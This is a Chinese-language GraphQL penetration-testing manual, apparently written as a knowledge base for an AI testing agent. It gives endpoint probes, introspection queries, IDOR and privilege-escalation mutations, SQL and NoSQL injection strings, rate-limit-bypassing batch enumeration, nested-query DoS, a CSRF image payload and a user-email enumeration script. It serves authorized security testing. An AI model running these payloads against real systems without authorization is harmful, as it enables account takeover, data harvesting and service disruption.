> 结构：上半原有是主线；下半补充加深。短表没点名时按现场：自省 / 越权 id / 注入 / 批量。不必整篇通读。
>
> 写不写只认 `~/.grok/rules/vuln-report-format.md`。Introspection 仅 schema、无敏感字段 → 继续挖字段/越权/注入。

## 一、原有knowledge-base

# GraphQL 安全测试手册

## 一、GraphQL 识别

### 常见端点路径

```bash
# 标准路径
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql

# 检测方法
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'

# 返回 {"data":{"__typename":"Query"}} → 确认是 GraphQL
```

---

## 二、Introspection 查询（Schema 泄露）

### 完整 Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### 简化版 Introspection

```bash
# 获取所有类型
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# 获取所有查询
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'

# 获取所有 mutation
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### 从 Schema 中挖掘信息

```
关注点:
1. 管理员专用 mutation: deleteUser, updateRole, banUser
2. 内部字段: isAdmin, internalId, secretToken
3. 隐藏查询: adminUsers, internalLogs, debugInfo
4. 敏感类型: CreditCard, BankAccount, PrivateMessage
```

---

## 三、越权测试

### 水平越权

```graphql
# 查询他人信息
query {
  user(id: "VICTIM_ID") {
    id
    email
    phone
    orders {
      id
      amount
    }
  }
}

# 修改他人数据（仅验证，不实际执行）
mutation {
  updateUser(id: "VICTIM_ID", input: {email: "attacker@evil.com"}) {
    id
    email
  }
}
```

### 垂直越权

```graphql
# 普通用户调用管理员 mutation
mutation {
  deleteUser(id: "TARGET_ID") {
    success
  }
}

mutation {
  promoteToAdmin(userId: "MY_ID") {
    user {
      id
      role
    }
  }
}
```

---

## 四、注入测试

### SQL 注入

```graphql
# 在参数中注入 SQL
query {
  user(id: "1' OR '1'='1") {
    id
    username
  }
}

query {
  searchUsers(keyword: "admin' UNION SELECT password FROM users--") {
    username
    email
  }
}
```

### NoSQL 注入

```graphql
# MongoDB 注入
query {
  user(id: "{\"$ne\": null}") {
    id
    username
  }
}
```

---

## 五、批量查询攻击

### Query Batching（绕过速率限制）

```bash
# 单次请求发送多个查询
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { email } }"},
    {"query": "{ user(id: \"2\") { email } }"},
    {"query": "{ user(id: \"3\") { email } }"},
    ...
    {"query": "{ user(id: \"1000\") { email } }"}
  ]'
```

### Alias 批量查询

```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  ...
  user1000: user(id: "1000") { email }
}
```

---

## 六、嵌套查询 DoS

```graphql
# 深度嵌套消耗服务器资源
query {
  user(id: "1") {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      id
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# 循环引用 DoS
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
            }
          }
        }
      }
    }
  }
}
```

---

## 七、字段建议利用

```bash
# 故意拼错字段名，利用 "Did you mean" 错误枚举字段
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { passwrd } }"}'

# 响应可能包含: "Did you mean: password, passwordHash?"
# 从而发现隐藏字段
```

---

## 八、CSRF 测试

### GET 请求 CSRF

```bash
# 部分 GraphQL 端点支持 GET 请求
curl "https://target.com/graphql?query={user(id:\"1\"){email}}"

# 如果支持 GET → 可构造 CSRF
<img src="https://target.com/graphql?query=mutation{deleteUser(id:\"1\"){success}}">
```

### Content-Type 绕过

```bash
# 尝试 text/plain 绕过 CORS 预检
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: text/plain" \
  -d '{"query": "mutation { deleteUser(id: \"1\") { success } }"}'
```

---

## 九、信息泄露

### 错误信息泄露

```graphql
# 触发错误获取内部信息
query {
  user(id: "invalid_id_format_to_trigger_error") {
    id
  }
}

# 响应可能包含:
# - 数据库错误（SQL 语句）
# - 内部路径（/var/www/app/...）
# - 框架版本
```

### 调试模式检测

```bash
# 检查是否开启调试模式
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name } } }"}'

# 如果返回 @debug, @internal 等指令 → 可能有调试功能
```

---

## 十、工具推荐

### graphw00f（指纹识别）

```bash
# 识别 GraphQL 引擎类型
pip3 install graphw00f
graphw00f -t https://target.com/graphql
```

### InQL（Burp 插件）

```
功能:
- 自动 Introspection
- 生成查询模板
- 批量测试
- 可视化 Schema

安装: Burp → Extender → BApp Store → InQL Scanner
```

### graphql-voyager（Schema 可视化）

```bash
# 在线工具
https://graphql-kit.com/graphql-voyager/

# 本地运行
npm install -g graphql-voyager
voyager --introspection schema.json
```

### 自动化测试脚本

```python
import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

# Introspection
introspection_query = '{"query": "{ __schema { types { name } } }"}'
r = requests.post(url, headers=headers, data=introspection_query)
schema = r.json()

# 提取所有类型
types = [t['name'] for t in schema['data']['__schema']['types']]
print(f"发现 {len(types)} 个类型:")
for t in types:
    if not t.startswith('__'):  # 过滤内置类型
        print(f"  - {t}")

# 批量 ID 枚举
for user_id in range(1, 101):
    query = f'{{"query": "{{ user(id: \\"{user_id}\\") {{ id email }} }}"}}'
    r = requests.post(url, headers=headers, data=query)
    if r.status_code == 200 and 'email' in r.text:
        print(f"用户 {user_id}: {r.json()}")
```

---

## 十一、防护检测

```bash
# 检测是否有查询深度限制
# 发送深度 20 的嵌套查询，观察是否被拦截

# 检测是否有查询复杂度限制
# 发送包含 100 个字段的查询

# 检测是否有速率限制
# 短时间内发送 100 次相同查询

# 检测是否禁用 Introspection
# 发送 __schema 查询，返回错误 → 已禁用
```

---

## 二、补充：graphql-test

### graphql-test

### GraphQL and Hidden Parameters — Introspection, Batching, and Undocumented Fields

## 1. GRAPHQL FIRST PASS

```graphql
query { __typename }
query {
  __schema {
    types { name }
  }
}
```

If introspection is restricted, continue with:

- field suggestions and error-based discovery
- known type probes like `__type(name: "User")`
- JS and mobile bundle route extraction

## 2. HIGH-VALUE GRAPHQL TESTS

| Theme | Example |
|---|---|
| IDOR | `user(id: "victim")` |
| batching | array of login or object fetch operations |
| hidden fields | admin-only fields exposed in type definitions |
| nested authz gaps | related object fields with weaker checks |

## 3. HIDDEN PARAMETER DISCOVERY

Look for:

- fields present in admin docs but not public docs
- `additionalProperties` or permissive schemas
- frontend code using richer request bodies than visible UI controls
- mobile endpoints carrying role, org, feature-flag, or internal filter fields

## 4. NEXT ROUTING

- If hidden fields affect privilege: [api authorization and bola](idor-test.md)
- If GraphQL batching changes auth or rate behavior: [api auth and jwt abuse](oauth-jwt-test.md)
- If endpoint discovery is incomplete: see `recon-methodology.md` and JS reverse (`js-reverse-guide.md`)
